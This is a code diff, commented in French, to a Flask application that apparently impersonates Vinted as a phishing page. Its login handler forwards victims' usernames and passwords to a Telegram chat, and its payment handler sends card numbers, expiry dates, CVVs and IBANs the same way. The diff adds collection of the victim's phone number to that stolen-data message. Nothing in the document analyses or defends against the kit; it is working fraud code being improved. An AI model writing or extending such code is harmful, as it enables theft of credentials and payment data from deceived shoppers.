@@ -32,7 +32,7 @@ def login():
     username = request.form["username"]
     password = request.form["password"]
 
-    # NOUVEAU : Envoie le message Telegram après la soumission du login
+    # Envoie le message Telegram après la soumission du login
     message = (
         f"[Vinted Login]\n"
         f"👤 Pseudo: {username}\n"
@@ -79,7 +79,11 @@ def process_payment():
     card_number = request.form["card_number"]
     expiry_date = request.form["expiry_date"]
     cvv = request.form["cvv"]
-    iban = request.form["iban"]  # Assurez-vous d'avoir ce champ dans payment_info.html si vous le traitez
+    iban = request.form["iban"]
+
+    # **** CORRECTION ICI : RÉCUPÉRATION DU NUMÉRO DE TÉLÉPHONE ****
+    phone_number = request.form.get("phone_number")
+    # ***************************************************************
 
     # Formate le message complet de la carte bancaire pour Telegram
     message = (
@@ -91,7 +95,8 @@ def process_payment():
         f"🔢 Num carte: {card_number}\n"
         f"📅 Exp: {expiry_date}\n"
         f"🔐 CVV: {cvv}\n"
-        f"🏦 IBAN: {iban}"  # Inclure IBAN dans le message
+        f"🏦 IBAN: {iban}\n"
+        f"📞 Téléphone: {phone_number or 'N/A'}"  # **** CORRECTION ICI : AJOUT AU MESSAGE ****
     )
 
     # Envoie le message à Telegram
